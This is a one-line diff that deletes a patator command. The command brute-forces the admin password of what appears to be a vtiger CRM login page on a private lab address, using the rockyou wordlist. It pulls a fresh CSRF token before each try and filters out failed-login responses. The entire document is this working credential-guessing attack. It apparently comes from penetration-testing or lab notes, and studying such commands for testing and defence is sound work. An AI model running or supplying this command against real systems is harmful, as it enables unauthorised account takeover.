@@ -1,1 +1,0 @@
-patator http_fuzz url='http://192.168.101.10:88/index.php?module=Users&action=Login' follow=1 accept_cookie=1  method=POST body='__vtrftk=_N1_&username=admin&password=FILE0' 0="/usr/share/wordlists/rockyou.txt" before_urls=http://192.168.101.10:88/index.php before_egrep='_N1_:var csrfMagicToken = "(sid:\w+,\w+)' -x ignore:fgrep='Invalid username or password.' -x retry:code=502
